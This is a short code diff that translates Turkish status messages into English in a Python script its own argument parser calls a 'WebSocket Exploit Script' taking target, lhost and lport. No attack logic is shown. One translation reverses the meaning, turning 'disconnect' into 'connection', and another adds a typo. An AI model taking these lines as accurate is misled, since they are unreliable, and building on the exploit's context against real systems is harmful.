@@ -85,14 +85,14 @@ async def main(target, lhost, lport):
                     print("[>] PONG     3")
                     
                 if frame.startswith("341"):  
-                    print("[*] Namespace disconnect görüldü, çıkılıyor.")
+                    print("[*] Namespace connection was detected, exiting.")
                     break
                     
             except websockets.ConnectionClosed:
-                print("[*] WebSocket bağlantısı kapandı")
+                print("[*] WebSocket connection closed")
                 break
 
-    print("[*] İşlem tamamlandı.")
+    print("[*]Complated.")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='WebSocket Exploit Script')
